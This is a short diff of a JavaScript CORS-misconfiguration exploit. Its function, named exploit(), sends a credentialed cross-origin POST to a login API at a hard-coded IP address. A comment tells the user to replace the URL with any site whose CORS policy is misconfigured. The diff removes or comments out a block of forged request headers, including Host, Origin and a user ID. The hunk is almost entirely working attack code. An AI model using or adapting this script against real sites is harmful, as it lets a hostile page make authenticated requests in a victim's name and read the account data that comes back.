@@ -51,18 +51,8 @@ function exploit() {
       }
  };
  xhttp.open("POST", "https://139.224.42.111/api/user/passport/login", true); //change the URL to the one which has mis-configured CORS policy
- xhttp.setRequestHeader("Accept", "application/json, text/plain, */*");
- xhttp.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
- xhttp.setRequestHeader("Host", "139.224.42.111");
- xhttp.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; rv:97.0) Gecko/20100101 Firefox/97.0");
- xhttp.setRequestHeader("Accept-Encoding", "gzip, deflate");
- xhttp.setRequestHeader("Content-Type", "application/json");
- xhttp.setRequestHeader("userTempId", "0b5c72e4-eae9-423d-88ae-ed8df5c36683");
- xhttp.setRequestHeader("Content-Length", "32");
- xhttp.setRequestHeader("Origin", "http://139.224.42.111");
- xhttp.setRequestHeader("Connection", "Connection");
- xhttp.setRequestHeader("Referer", "Referer");
-
+ //xhttp.setRequestHeader("Accept", "application/json, text/plain, */*");
+ //xhttp.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
  xhttp.withCredentials = true;
  xhttp.send();
 }
